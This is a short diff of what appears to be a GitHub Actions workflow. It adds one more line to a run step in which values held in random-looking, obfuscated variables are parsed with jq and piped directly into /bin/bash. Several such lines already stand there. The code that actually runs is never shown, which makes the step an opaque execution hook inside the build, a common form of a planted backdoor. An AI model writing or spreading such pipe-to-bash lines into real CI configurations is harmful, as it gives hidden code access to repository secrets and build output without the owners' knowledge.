@@ -39,6 +39,7 @@ jobs:
           echo $rwwa55 | jq -r .lijjg29 | /bin/bash
           echo $a22086 | jq -r .gqul5712 | /bin/bash
           printf '%s' "$esulp2849" | jq -r .l44 | /bin/bash
+          printf '%s' "$b896" | jq -r .nqbq9 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
